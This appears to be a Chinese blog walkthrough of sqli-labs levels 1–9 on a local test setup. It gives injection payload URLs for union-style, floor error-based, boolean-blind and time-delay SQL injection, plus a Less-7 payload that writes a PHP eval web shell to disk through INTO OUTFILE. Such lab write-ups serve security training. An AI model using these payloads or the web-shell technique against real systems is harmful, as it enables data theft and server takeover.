**目录**

[Less-1: 字符型注入](#t0)

[Less-2: 数字型注入](#t1)

[Less-3: 单引号字符型+括号](#t2)

[Less-4: 双引号字符型+括号](#t3)

[Less-5: 单引号字符型+固定输出信息 (floor报错注入&盲注)](#t4)

[Less-6: 双引号字符型+固定输出信息](#t5)

[Less-7: 写入文件](#t6)

[Less-8: Boolean型盲注](#t7)

[Less-9: 延时注入](#t8)

* * *

先附上sqli的源代码：链接: [https://pan.baidu.com/s/1d2rZVg5hz0ZBv2yg-UoArw](https://pan.baidu.com/s/1d2rZVg5hz0ZBv2yg-UoArw) 密码: 5w9y

我是在本地用phpstudy搭的一个环境。

### Less-1: 字符型注入

输入  [http://127.0.0.1/sqli/Less-1/?id=1'](http://127.0.0.1/sqli/Less-1/?id=1%27)

发生了报错，可以知道存在注入,通过报错信息，我们可以猜到sql查询的源代码

```
select*from security where id=' $_GET[id] ' limit 0 ,1
```


![](https://img-blog.csdn.net/20180825112220380?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们找到了注入点之后就可以进行注入了，union注入，盲注等等都可以。

```
http://127.0.0.1/sqli/Less-1/?id=1' and 1=2 #       
//  and 1=2 就是注入点，我们就可以用工具进行注入了      
http://127.0.0.1/sqli/Less-1/?id=1' #inject# #
```


### Less-2: 数字型注入

我们发现输入1 and 1=1 和 1 and 1=2 页面不一样，所以页面存在注入漏洞

```
http://127.0.0.1/sqli/Less-2/?id=1 and 1=1      
http://127.0.0.1/sqli/Less-2/?id=1 and 1=2
```


在后来的注入过程中，发现语句后面还有 limit 0 ,1 。所以可以猜到sql查询的源代码

```
select * from security where id=$_GET[id] limit 0,1
```


我们找到了注入点之后就可以进行注入了，union注入，盲注等等都可以。

```
http://127.0.0.1/sqli/Less-2/?id=1 and 1=2 #       
// and 1=2 就是注入点，我们就可以利用工具进行注入了      
http://127.0.0.1/sqli/Less-2/?id=1 #inject# #
```


### Less-3: 单引号字符型+括号

我们输入 [http://127.0.0.1/sqli/Less-3/?id=3'](http://127.0.0.1/sqli/Less-3/?id=3%27)  出现了报错。

![](https://img-blog.csdn.net/20180825115907793?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以存在注入，从报错信息我们可以猜到sql查询源代码

```
select * from security where id=('$_GET[id]') limit 0,1
```


我们找到了注入点之后就可以进行注入了，union注入，盲注等等都可以。

```
http://127.0.0.1/sqli/Less-3/?id=3') and 1=2 #       
//　and 1=2 就是注入点，我们就可以利用工具注入了      
http://127.0.0.1/sqli/Less-3/?id=3') #inject# #
```


### Less-4: 双引号字符型+括号

我们输入 [http://127.0.0.1/sqli/Less-4/?id=1'](http://127.0.0.1/sqli/Less-4/?id=1%27) 发现页面没有发生报错，猜想，可能是过滤了 ' 。

接着，我们再输入 [http://127.0.0.1/sqli/Less-4/?id=1"](http://127.0.0.1/sqli/Less-4/?id=1%27) ,页面报错，知道存在SQL注入。

![](https://img-blog.csdn.net/20180825120642630?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

从报错信息中我们可以猜到其sql查询源代码

```
select * from security where id=(" $_GET[id] ") limit 0,1
```


我们找到了注入点之后就可以进行注入了，union注入，盲注等等都可以。

```
http://127.0.0.1/sqli/Less-4/?id=1") and 1=2 #       
// and 1=2 就是注入点，我们就可以利用工具进行注入了      
http://127.0.0.1/sqli/Less-4/?id=1") #inject# #
```


### Less-5: 单引号字符型+固定输出信息 (floor报错注入&盲注)

输入 [http://127.0.0.1/sqli/Less-5/?id=1'](http://127.0.0.1/sqli/Less-5/?id=1%27)  发现页面报错。

![](https://img-blog.csdn.net/20180825140330628?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以存在SQL注入，可以猜到sql查询的源代码。

```
select * from security where id='$_GET[id]' limit 0,1
```


咦，这不是和Less-1是一样的吗？哦不，页面显示的信息有点不一样！最后我们发现无论输入什么正确的信息，页面都只显示 You are in .....

![](https://img-blog.csdn.net/20180825140703204?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

于是我们猜测，页面的输出信息是固定的。当sql查询语句正确时，就返回一个固定的信息。当sql查询语句错误时，就不显示。当sql语句有错时，页面就会报出sql语句的错！为了验证这个，我们看下源代码。果然，证实了我们的猜想！

![](https://img-blog.csdn.net/20180825141027330?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

那么，这种情况下我们怎么进行注入呢？

这种情况union注入是行不通的。因为我们只能通过order by知道有3列，而不知道多少列是显示列。

那盲注呢，我们可以通过页面是否显示来判断我们的输入是否正确，当我们的sql正确时，就显示you are in....。当我们的sql语句错误是，就不显示。

我们找到了注入点之后就可以进行盲注了！

```
http://127.0.0.1/sqli/Less-1/?id=1' and 1=2 #      
// and 1=2 就是注入点，我们就可以在注入点的位置插入判断语句了      
http://127.0.0.1/sqli/Less-1/?id=1' #inject# #
```


这题，我们网上的另一个好的解法就是利用双注入！双注入其实也就是floor报错注入。是利用count(),rand(),floor(),group by这几个函数结合在一起发生的漏洞，缺一不可！

双查询注入就是两个嵌套的查询，即 select  ....(select .....) ,里面的那个select被称为子查询，外面的那个select叫做父查询。执行顺序是先执行子查询，然后执行父查询。

下面是payload

```
// 我们可以将 user() 改成任何函数，以获取我们想要的信息      
http://127.0.0.1/sqli/Less-1/?id=1'  and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a) #       
//将其分解      
(select 1 from (Y)a)       
Y= select count(*) from information_schema.tables group by concat(Z)       
Z= user(),floor(rand(0)*2)
```


### Less-6: 双引号字符型+固定输出信息

输入  [http://127.0.0.1/sqli/Less-6/?id\=1](http://127.0.0.1/sqli/Less-6/?id=1%22)" 页面发生了报错

![](https://img-blog.csdn.net/20180825145712315?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以存在SQL注入，可以猜到sql查询的源代码。

```
select * from security where id="$_GET[id]" limit 0,1
```


可以利用 1＂# 进行绕过，后来发现和Less-5一样，页面输出固定的信息。所以我们可以利用Less-5相同的解法，只不过把Less-5里面绕过的　 ' 　换成　＂　即可！

### Less-7: 单引号+双括号

输入 1'  页面报错，但是没有提示出错原因，只是说有错误，很明显，是程序员把错误都给统一处理为You have an error in your SQL syntax 了。

![](https://img-blog.csdn.net/20180825152312783?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

于是猜测可能是[字符型](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E5%9E%8B&spm=1001.2101.3001.7020)的，所以输入 1'# ，页面报错！心想，可能过滤了#，于是换成 1'--+ ，发现还是报错了，有可能把注释符都给过滤了吧！于是我们再输入 1' and '1'='2 看看页面的显示，如果页面不正常显示，说明就是字符型的注入了，只不过是把注释符都给过滤了。可是，页面显示正常！！ 这就奇怪了，于是我偷偷的看了下源码，发现，参数用两个括号和单引号保护住了！

![](https://img-blog.csdn.net/20180825152632609?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

于是，我们可以这样构造payload

[http://127.0.0.1/sqli/Less-7/?id=1')) and 1=2#](http://127.0.0.1/sqli/Less-7/?id=1'%20rel=)

发现页面还是显示报错！

![](https://img-blog.csdn.net/2018082515325137?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

于是，我们继续看了下源代码！发现只有当我们的sql查询语句能查询到数据的时候，就返回固定的 You are in ... Use outfile......，当我们的sql查询语句错误或者返回的是空数据的时候，就返回固定的 You have an error in your SQL stntax。

![](https://img-blog.csdn.net/20180825153353717?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

那样的话，我们构造的payload就查询不到任何数据了。那么，这种情况下我们该如何解呢？我们看到当我们的sql语句能查询到数据的时候他的提示信息，  Use outfile ! 是不是要利用 outfile 这个函数呢？outfile 这个函数的用法是 select  A into outfile B 。意思就是将A写入B中，A可以是任意的文本内容，也可以是数据库查询到的数据，B是一个绝对路径的文件！

于是，我们可以构造这样的payload

```
// 意思就是读取表users的数据，写入到e盘的4.txt文件中      
http://127.0.0.1/sqli/Less-7/?id=1')) union select * from users into outfile "e:\4.txt" #       
// 我们可以将一句话木马写入，然后用菜刀连接，获得shell      
http://127.0.0.1/sqli/Less-7/?id=1')) union select 1,('<?php  @eval($_POST[aa]) ?>'),3  into outfile "e:\5.txt" #
```


### Less-8: Boolean型盲注

直接看源代码吧！

![](https://img-blog.csdn.net/20180825160827885?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

通过源代码我们知道，吧参数当成字符型处理。当sql查询语句正确的时候，返回You are in..... 当sql语句错误或没查询到任何数据时，不显示任何东西！所以，我们可以利用[boolean](https://so.csdn.net/so/search?q=boolean&spm=1001.2101.3001.7020)行盲注来判断，根据页面是否显示数据来判断我们的sql语句是否正确！

boolean盲注就是利用 substring() ，ascii() ，length() 这几个函数，结合二分法来判断数据的！手工boolean盲注很麻烦，可以利用工具来进行盲注！下面给出盲注的基本代码

```
http://127.0.0.1/sqli/Less-1/?id=1' and 1=2 #       
//  and 1=2 就是注入点，我们就可以用工具进行注入了      
http://127.0.0.1/sqli/Less-1/?id=1' #inject# #       
// 判断username列的第一个数据长度，第二个数据 limit 2，1  ，第三个数据 limit 3,1      
http://127.0.0.1/sqli/Less-1/?id=-1'  and (select length(username) from admin  limit 1) >5 #       
// 判断username列的第一个数据的第一个字符的ascii值      1
http://127.0.0.1/sqli/Less-1/?id=-1'  and (select ascii(username) from admin limit 1)>97 #       1
// 判断username列的第一个数据的第2个字符的ascii值      1
http://127.0.0.1/sqli/Less-1/?id=-1'  and (select ascii(substring(username,2,1)) from admin limit 1)>97 #       1
// 判断username列的第二个数据的第2个字符的ascii值      1
http://127.0.0.1/sqli/Less-1/?id=-1'  and (select ascii(substring(username,2,1)) from admin limit 2,1)>97 #
```


### Less-9: 延时注入

直接看源代码

![](https://img-blog.csdn.net/20180825162815451?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

从源代码中我们知道，把参数当成了字符来处理。无论我们的查询语句是否正确，都返回固定的一个信息： You are in ...........

所以，这种情况下我们可以利用延时注入，根据页面的响应时间来判断我们的输入是否正确！延时注入主要是利用 if(条件，true时执行，false时执行) 函数。延时注入比boolean盲注更加的耗费时间，因为我们要时间等待页面的响应。所以，我们进行延时注入也一般是利用工具来注入！下面的延时注入的基本思路的代码

```
// 判断当前数据库的第一个字符的ascii是否大于100，如果大于100，页面立马响应，否则3秒后响应      
http://127.0.0.1/sqli/Less-9/?id=1' and if (ascii(substr(database(),1,1))>100,1,sleep(3))#
```
